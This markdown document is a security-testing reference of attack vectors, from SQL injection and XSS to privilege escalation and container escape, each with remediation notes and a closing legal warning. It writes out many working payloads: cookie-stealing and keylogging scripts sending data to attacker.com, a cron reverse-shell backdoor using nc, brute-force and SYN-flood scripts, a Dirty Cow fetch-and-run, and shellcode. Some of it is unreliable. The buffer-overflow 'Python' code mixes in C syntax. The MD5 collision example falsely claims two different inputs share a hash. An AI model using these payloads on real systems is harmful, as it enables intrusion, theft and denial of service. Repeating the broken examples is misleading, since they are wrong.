# Attack Vectors Reference

## Overview
Comprehensive reference of common attack vectors and their exploitation techniques for security testing.

## Web Application Attacks

### SQL Injection (SQLi)

**Description:** Injection of malicious SQL queries through input fields

**Types:**
- **In-band SQLi:** Error-based and Union-based
- **Blind SQLi:** Boolean-based and Time-based
- **Out-of-band SQLi:** Data exfiltration via external channels

**Detection:**
```sql
' OR '1'='1
' OR '1'='1'--
admin' --
' UNION SELECT username, password FROM users --
' AND 1=1
' AND 1=2
```

**Exploitation:**
```sql
-- Database enumeration
' UNION SELECT table_name FROM information_schema.tables --

-- Column enumeration
' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users' --

-- Data extraction
' UNION SELECT username, password FROM users --

-- Blind injection timing
' AND SLEEP(5)--
' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'--
```

**Remediation:**
- Use parameterized queries
- Input validation and sanitization
- Least privilege database accounts
- Web Application Firewalls (WAF)

### Cross-Site Scripting (XSS)

**Description:** Injection of malicious scripts into web pages viewed by other users

**Types:**
- **Stored XSS:** Malicious script stored on server
- **Reflected XSS:** Malicious script reflected in response
- **DOM-based XSS:** Vulnerability in client-side JavaScript

**Detection:**
```html
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
<body onload=alert('XSS')>
<input autofocus onfocus=alert('XSS')>
<iframe src="javascript:alert('XSS')">
```

**Exploitation:**
```javascript
// Cookie stealing
<script>
fetch('http://attacker.com?c='+document.cookie)
</script>

// Keylogger
<script>
document.addEventListener('keypress', function(e) {
  fetch('http://attacker.com?k='+e.key);
})
</script>

// Phishing
<div id="fake-login">
  <form action="http://attacker.com/phish">
    <input type="text" name="username">
    <input type="password" name="password">
  </form>
</div>
```

**Remediation:**
- Output encoding (HTML, JavaScript, URL)
- Content Security Policy (CSP)
- Input validation
- HttpOnly cookies

### Cross-Site Request Forgery (CSRF)

**Description:** Unwanted actions performed on behalf of authenticated user

**Detection:**
- Check for anti-CSRF tokens
- Test state-changing requests without tokens

**Exploitation:**
```html
<!-- CSRF attack payload -->
<img src="http://bank.com/transfer?to=attacker&amount=1000">

<form action="http://bank.com/transfer" method="POST">
  <input type="hidden" name="to" value="attacker">
  <input type="hidden" name="amount" value="1000">
  <input type="submit" value="Click here!">
</form>

<script>
fetch('http://bank.com/transfer', {
  method: 'POST',
  body: 'to=attacker&amount=1000'
});
</script>
```

**Remediation:**
- Anti-CSRF tokens
- SameSite cookie attribute
- CORS validation
- Verify Origin/Referer headers

### Authentication Attacks

**Brute Force:**
```bash
# Hydra
hydra -l admin -P /usr/share/wordlists/rockyou.txt target.com http-post-form "/login:user=^USER^&pass=^PASS^:F=failed"

# Medusa
medusa -h target.com -u admin -P /usr/share/wordlists/rockyou.txt -M http -m DIR:/login

# Custom script
#!/usr/bin/env python3
import requests

wordlist = open('/usr/share/wordlists/rockyou.txt', 'r')
for password in wordlist:
    r = requests.post('http://target.com/login', 
                     data={'username': 'admin', 'password': password.strip()})
    if 'Login successful' in r.text:
        print(f"Password found: {password}")
        break
```

**Default Credentials:**
- `admin:admin`
- `admin:password`
- `admin:123456`
- `root:root`
- `admin:admin123`

**Session Fixation:**
```bash
# Capture session ID
curl -c cookies.txt http://target.com

# Fixate session
curl -b cookies.txt -c new_cookies.txt http://target.com/set_session?ID=ATTACKER_SESSION

# Login and get valid session with fixed ID
curl -b new_cookies.txt http://target.com/login
```

**Remediation:**
- Multi-factor authentication
- Account lockout after failed attempts
- Strong password policies
- Session management best practices

## Network Attacks

### Man-in-the-Middle (MITM)

**ARP Spoofing:**
```bash
# Enable IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# ARP spoofing
arpspoof -i eth0 -t target_ip gateway_ip

# Intercept with Wireshark or tcpdump
tcpdump -i eth0 -w capture.pcap
```

**DNS Spoofing:**
```bash
# dnsspoof
dnsspoof -i eth0 -f /etc/dnsspoof.conf

# /etc/dnsspoof.conf example
*.target.com 10.0.0.1
```

**Remediation:**
- HTTPS with valid certificates
- HSTS (HTTP Strict Transport Security)
- DNSSEC
- ARP inspection
- Network segmentation

### Denial of Service (DoS/DDoS)

**SYN Flood:**
```bash
# hping3
hping3 -S -p 80 --flood --rand-source target_ip

# Custom Python script
#!/usr/bin/env python3
import socket
import random

target = "target.com"
port = 80

while True:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target, port))
    s.sendto(("GET /" + "X"*1024).encode(), (target, port))
    s.close()
```

**HTTP Flood:**
```bash
# Slowloris attack
slowloris -dns target.com -port 80

# GoldenEye
goldeneye.py http://target.com -w 500 -m 50
```

**Remediation:**
- Rate limiting
- SYN cookies
- DDoS protection services
- Firewall rules
- Anomaly detection

## System Attacks

### Privilege Escalation

**Linux Kernel Exploits:**
```bash
# Check kernel version
uname -a

# Search for exploits
searchsploit linux kernel 5.4

# Dirty Cow exploit example
wget https://www.exploit-db.com/exploits/40839.c
gcc -pthread dirtyc0w.c -o dirtyc0w -lcrypt
./dirtyc0w /etc/passwd root:$(openssl passwd -1 newpass):0:0:root:/root:/bin/bash
```

**SUID Binaries:**
```bash
# Find SUID files
find / -perm -4000 -type f 2>/dev/null

# Exploiting SUID binaries
# Example: nmap
nmap --interactive
!sh

# Example: find
find . -exec /bin/sh \;

# Example: vi
vi
:!sh
```

**Cron Jobs:**
```bash
# Check cron jobs
crontab -l
cat /etc/crontab
ls -la /etc/cron.*

# If writable, create backdoor
echo "* * * * * root /bin/bash -c 'nc -e /bin/sh attacker_ip 4444'" >> /etc/crontab
```

**Remediation:**
- Keep kernel and software updated
- Remove unnecessary SUID files
- Restrict cron job permissions
- Principle of least privilege

### Buffer Overflow

**Stack Buffer Overflow:**
```python
#!/usr/bin/env python3
import struct

# Vulnerable function
def vulnerable_function(buffer):
    char small_buffer[100];
    strcpy(small_buffer, buffer);  # No bounds checking

# Exploitation
buffer = b"A" * 104  # Fill buffer + overwrite EIP
buffer += struct.pack("<I", 0xbffff000)  # Return address
buffer += b"\x90" * 32  # NOP sled
buffer += b"\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xeb\x16\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68"  # Shellcode

vulnerable_function(buffer)
```

**Remediation:**
- Use safe functions (strncpy instead of strcpy)
- Stack canaries
- ASLR (Address Space Layout Randomization)
- DEP/NX (Data Execution Prevention)

## Cryptographic Attacks

### Weak Encryption

**RC4 Break:**
```python
#!/usr/bin/env python3
from Crypto.Cipher import ARC4

# RC4 is weak, key can be recovered from known plaintext
key = b"weakkey"
cipher = ARC4.new(key)

# If attacker knows plaintext and ciphertext, they can recover key
```

**Hash Collision:**
```python
#!/usr/bin/env python3
import hashlib

# MD5 and SHA-1 are vulnerable to collisions
# MD5 collision example
data1 = b"\x31\x0c\xce\xee\x3c\x81\xd9\x44\x95\x2e\x12\x38\x89\x9f\x4a\xb4"
data2 = b"\x31\x0c\xce\xee\x3c\x81\xd9\x44\x95\x2e\x12\x38\x89\x9f\x4a\xb5"

hash1 = hashlib.md5(data1).hexdigest()
hash2 = hashlib.md5(data2).hexdigest()

# hash1 == hash2 even though data1 != data2
```

**Remediation:**
- Use strong encryption (AES-256)
- Use strong hash functions (SHA-256, SHA-3)
- Proper key management
- Constant-time comparison

### Padding Oracle Attack

**Detection:**
```bash
# Test for padding oracle
curl -d "encrypted_data" https://target.com/decrypt
# Different error messages for padding vs. invalid data

# Use padbuster
padbuster https://target.com/decrypt ENCRYPTED_DATA 16 -cookies "JSESSIONID=xxx"
```

**Remediation:**
- Use constant-time comparison
- Don't reveal padding errors
- Use authenticated encryption (AES-GCM)

## API Security Attacks

### API Key Leakage
```bash
# Discover API keys
curl https://api.target.com/users

# If API key in URL: ?api_key=sk_live_xxxx
# Try to find leaked keys in GitHub
githubsearch "sk_live_" "target.com"
```

### GraphQL Injection
```graphql
# Introspection query to discover schema
{
  __schema {
    types {
      name
      fields {
        name
        type {
          name
        }
      }
    }
  }
}

# Bypass rate limiting
query {
  users(first: 1000) {
    edges {
      node {
        id
        email
        password  # Sensitive data
      }
    }
  }
}
```

**Remediation:**
- Disable introspection in production
- Query complexity limiting
- Rate limiting
- Input validation

## Cloud Attacks

### AWS Metadata Exploitation
```bash
# SSRF to access EC2 metadata
curl http://169.254.169.254/latest/meta-data/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Get temporary credentials and access other AWS resources
```

### Container Escape
```bash
# Privileged container escape
docker run --privileged -it ubuntu:latest bash

# Mount host filesystem
mkdir /mnt/host
mount /dev/sda1 /mnt/host

# Or access host Docker socket
docker run -v /var/run/docker.sock:/var/run/docker.sock -it ubuntu:latest bash
docker ps  # Can see host containers
```

**Remediation:**
- Disable instance metadata service (if not needed)
- Use IMDSv2 with token
- Avoid privileged containers
- Network policies
- Runtime security tools

## Defense Strategies

### Defense in Depth
1. **Prevention:** Secure coding, input validation, authentication
2. **Detection:** Monitoring, logging, IDS/IPS
3. **Response:** Incident response, containment, remediation

### Security Testing Checklist
- [ ] Automated vulnerability scanning
- [ ] Manual penetration testing
- [ ] Code reviews
- [ ] Configuration audits
- [ ] Threat modeling
- [ ] Security training

### Tools Reference
| Attack Type | Tools |
|-------------|--------|
| Web Application | OWASP ZAP, Burp Suite, SQLMap, XSSer |
| Network | Nmap, Metasploit, Wireshark |
| Exploitation | Metasploit, ExploitDB, Searchsploit |
| Password Cracking | John the Ripper, Hashcat, Hydra |
| Wireless | Aircrack-ng, Wifite, Kali tools |

## Legal and Ethical Considerations

**CRITICAL WARNING:**
- Only test systems you own or have written authorization to test
- Obtain written permission before any testing
- Follow responsible disclosure practices
- Adhere to local laws and regulations
- Use secure testing environments
- Never cause actual damage
- Report findings responsibly

## References
- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [MITRE ATT&CK](https://attack.mitre.org/)
- [CWE Top 25](https://cwe.mitre.org/top25/)
- [Exploit Database](https://www.exploit-db.com/)
